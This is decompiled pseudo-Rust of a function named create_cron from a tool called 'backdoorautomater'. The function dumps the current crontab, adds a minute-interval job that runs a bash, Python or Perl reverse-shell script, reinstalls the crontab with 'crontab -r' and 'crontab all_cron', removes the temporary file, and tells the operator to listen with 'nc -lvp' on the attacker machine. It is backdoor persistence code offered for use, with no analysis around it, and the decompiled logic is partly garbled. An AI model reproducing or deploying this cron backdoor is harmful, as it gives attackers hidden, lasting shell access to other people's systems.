fn backdoorautomater::cronshell::create_cron(a0: i64, a1: i64, a2: u64, a3: i64, a4: u32, a5: i64) -> long long {
    let v0: std::fs::File;  // [bp-0x2ec]
    let v1: Option<struct24>;  // [bp-0x2e8], Other Possible Types: struct149, struct24, u128
    let v2: struct24;  // [bp-0x2e8]
    let v3: struct56;  // [bp-0x2e8]
    let v4: struct56;  // [bp-0x2e8]
    let v5: struct56;  // [bp-0x2e8]
    let v6: alloc::raw_vec::Cap;  // [bp-0x2d8], Other Possible Types: struct24, u64
    let v7: struct24;  // [bp-0x2d8]
    let v8: struct56;  // [bp-0x2c8]
    let v9: struct24;  // [bp-0x2a8]
    let v10: struct24;  // [sp-0x27c], Other Possible Types: u32
    let v11: alloc::string::String;  // [bp-0x278], Other Possible Types: alloc::vec::Vec<u8, alloc::alloc::Global>, alloc::borrow::Cow<str>, core::result::Result<std::process::Output, std::io::error::Error>, struct24
    let v12: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x278]
    let v13: u64;  // [bp-0x270]
    let v14: u64;  // [bp-0x268]
    let v15: i64;  // [bp-0x240]
    let v16: core::fmt::Arguments;  // [bp-0x238], Other Possible Types: struct149, u128
    let v17: struct56;  // [bp-0x238]
    let v18: struct24;  // [bp-0x228], Other Possible Types: struct56, u128
    let v19: struct56;  // [bp-0x218]
    let v20: u64;  // [bp-0x210]
    let v21: core::fmt::rt::Argument;  // [bp-0x208], Other Possible Types: struct149, u64
    let v22: u128;  // [bp-0x1f8]
    let v23: struct24;  // [bp-0x1f8]
    let v24: std::io::stdio::Stdin;  // [bp-0x1e8]
    let v25: i64;  // [bp-0x1e0]
    let v26: core::result::Result<std::fs::File, std::io::error::Error>;  // [bp-0x1d8], Other Possible Types: struct32, struct149, struct24
    let v27: struct149;  // [bp-0x1d8]
    let v28: struct24;  // [bp-0x1d8]
    let v29: struct24;  // [bp-0x1d8], Other Possible Types: u128
    let v30: u128;  // [bp-0x1d8]
    let v32: &str;  // [bp-0x1d8]
    let v33: u32;  // [bp-0x1d4]
    let v35: u128;  // [sp-0x1c8]
    let v36: alloc::raw_vec::Cap;  // [bp-0x1c8]
    let v37: u128;  // [bp-0x1c0]
    let v38: u128;  // [bp-0x1b8]
    let v39: u64;  // [bp-0x1b0]
    let v40: i64;  // [bp-0x100]
    let v41: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0xf8]
    let v42: struct24;  // [bp-0xf8]
    let v43: void*;  // [bp-0xd8], Other Possible Types: struct16
    let v44: u64;  // [bp-0xd0]
    let v45: void*;  // [bp-0xc8]
    let v46: alloc::string::String;  // [bp-0xc0]
    let v47: Option<struct24>;  // [bp-0xa8]
    let v48: struct24;  // [bp-0xa8]
    let v49: alloc::string::String;  // [bp-0x90]
    let v50: struct24;  // [bp-0x78]
    let v51: struct44;  // [bp-0x60]
    let v52: u128;  // [bp-0x50]
    let v56: core::option::Option<char>;  // eax
    let v61: u64;  // r12
    let v62: u64;  // r14
    let v64: u64;  // rax
    let v65: u32;  // ebx
    let v69: u64;  // rdx
    let v70: &str;  // rsi
    let v72: struct56;  // xmm1
    let v75: struct24;  // xmm1
    let v78: u128;  // xmm1
    let v81: u64;  // [bp-0x2d8]

    v30 = core::str::iter::Chars {
        iter: core::slice::iter::Iter<u8> {
            ptr: core::ptr::non_null::NonNull<u8> {
                pointer: *((a2 + 8) as &i64)
            }
            end_or_len: *((a2 + 16) as &i64) + *((a2 + 8) as &i64)
            _marker: core::marker::PhantomData<&u8> { }
        }
    };
    v56 = <core::str::iter::Chars as core::iter::traits::double_ended::DoubleEndedIterator>::next_back(&v30) as u32;
    if let None = v56 {
        if let Some(_) = v56 {
            alloc::string::String::push(a2, a1 as u8);
        }
    }
    v35 = *((v25 + 16) as &i64);
    v30 = *(v25 as &i128);
    v37 = *(v40 as &i128);
    v39 = *((v40 + 16) as &i64);
    v11 = alloc::str::join_generic_copy(&v30, 2, 1, 0);
    v24 = v14;
    v22 = *(&v11.buf.cap as &i128);
    v49 = <alloc::string::String as core::clone::Clone>::clone(a1);
    v46 = <alloc::string::String as core::clone::Clone>::clone(&v22);
    v27 = std::process::Command::new("sh");
    v11 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v27, "-c"), "crontab -l > all_cron"));
    v17 = core::result::Result<T,E>::expect(&v11, "src/cronshell.rs");
    v11 = alloc::string::String::from_utf8_lossy(v17.field_32 as i64, v20);
    v28 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v11), a2);
    v9 = v29;
    backdoorautomater::sanitizer::sanitize_system_command(&v9);
    v29 = std::fs::File::open("all_cron");
    if let Err(_) = v29 {
        return v13;
    }
    v51 = std::io::buffered::bufreader::BufReader<R>::with_capacity(0x2000, v33);
    v10 = a4;
    v43 = 0;
    v44 = 8;
    v45 = 0;
    v38 = *(&v51.field_32 as &i128);
    v35 = v52;
    v29 = *(&v51.field_0 as &i128);
    loop {
        v11 = <std::io::Lines<B> as core::iter::traits::iterator::Iterator>::next(&v29);
        if v11.field_0 as i64 == 9223372036854775809 {
            break;
        }
        if v11.field_0 as i64 == 0x8000000000000000 {
            return v13;
        }
        v50 = struct24 {
            field_0: v11.field_0 as i64
            field_16: v14
        };
        v43 = alloc::vec::Vec<T,A>::push(&v50);
    }
    v61 = v10;
    v62 = v61 & 4294967295;
    if v62 == 3 {
        v1 = struct24 {
            field_0: *(a1 as &i128)
            field_16: *((a1 + 16) as &i64)
        };
        v11 = struct24 {
            field_0: *(v15 as &i128)
            field_16: *((v15 + 16) as &i64)
        };
        v26 = v23;
        backdoorautomater::cronshell::write_shell_bash(&v1, &v11, &v26);
    } else if v62 != 2 {
        if !(v62 == 1) {
            goto LABEL_461e50;
        }
        v1 = struct24 {
            field_0: *(a1 as &i128)
            field_16: *((a1 + 16) as &i64)
        };
        v11 = struct24 {
            field_0: *(v15 as &i128)
            field_16: *((v15 + 16) as &i64)
        };
        v26 = v23;
        backdoorautomater::cronshell::write_shell_pyfile(&v1, &v11, &v26);
    } else {
        v1 = struct24 {
            field_0: *(a1 as &i128)
            field_16: *((a1 + 16) as &i64)
        };
        v11 = struct24 {
            field_0: *(v15 as &i128)
            field_16: *((v15 + 16) as &i64)
        };
        v32 as u192 = v23;
        backdoorautomater::cronshell::write_shell_perl(&v1, &v11, &v32 as u192);
    }
    backdoorautomater::sanitizer::sanitize_return_fn(v64);
LABEL_461e50:
    v32 = "*/";
    v35 = *((a5 + 8) as &i128);
    v11 = alloc::str::join_generic_copy(&v32 as u192, 2, 1, 0);
    v41 = v12;
    alloc::vec::Vec<T,A>::extend_from_slice(&v41, " * * * * ");
    if v61 == 1 || v62 == 2 {
        alloc::vec::Vec<T,A>::extend_from_slice(&v41, v70, v69);
    }
    alloc::vec::Vec<T,A>::extend_from_slice(&v41, v46);
    v26 = v42;
    v43 = alloc::vec::Vec<T,A>::push(&v26);
    v26 = std::fs::File::create("all_cron");
    if let Ok(v0) = v26 {
        v10 = v65;
        v26 = <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v43);
        v47 = <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v26);
        v6 = v81;
        match v47 {
            None => {
LABEL_462133:
                v26 = std::process::Command::new("sh");
                v11 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), "crontab -r"));
                v5 = core::result::Result<T,E>::expect(&v11, "src/cronshell.rs");
                v21 = v5.field_48;
                v72 = v5.field_16;
                v19 = v8;
                v18 = v72;
                v16 = v5.field_0;
                v11 = alloc::string::String::from_utf8_lossy(v19.field_0 as i64, v20);
                v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v11), a2);
                v6 = v36;
                v1 = v26.field_0;
                v9 = v2;
                backdoorautomater::sanitizer::sanitize_system_command(&v9);
                v26 = std::process::Command::new("sh");
                v11 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), "crontab all_cron"));
                v3 = core::result::Result<T,E>::expect(&v11, "src/cronshell.rs");
                v21 = v3.field_48;
                v75 = v3.field_16;
                v19 = v8;
                v18 = v75;
                v16 = v3.field_0;
                v11 = alloc::string::String::from_utf8_lossy(v19.field_0 as i64, v20);
                v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v11), a2);
                v6 = v36;
                v1 = v26.field_0;
                v9 = v2;
                backdoorautomater::sanitizer::sanitize_system_command(&v9);
                v26 = std::process::Command::new("sh");
                v11 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), "rm all_cron"));
                v4 = core::result::Result<T,E>::expect(&v11, "src/cronshell.rs");
                v21 = v4.field_48;
                v78 = v4.field_16;
                v19 = v8;
                v18 = v78;
                v16 = v4.field_0;
                v11 = alloc::string::String::from_utf8_lossy(v19.field_0 as i64, v20);
                v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v11), a2);
                v9 = v2;
                backdoorautomater::sanitizer::sanitize_system_command(&v9);
                println!("\n\x1b[36mGreat ! Please wait the cron, and your backdoor will be installed correctly\n");
                v1 = &v49;
                println!("Don't forget to put this netcat command on your attacker machine: nc -lvp {}\x1b[0m", &v1 as u128);
                return 0;
            },
            Some(v1) => {
                loop {
                    v11 = <alloc::string::String as core::clone::Clone>::clone(&v1);
                    alloc::vec::Vec<T,A>::extend_from_slice(&v11, "\n");
                    std::io::Write::write_all(&v0, v11);
                    if v13 {
                        break;
                    }
                    v47 = <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v26);
                    v6 = v7;
                    if let None = v47 {
                        goto LABEL_462133;
                    }
                }
            },
        }
    }
    return v13;
}
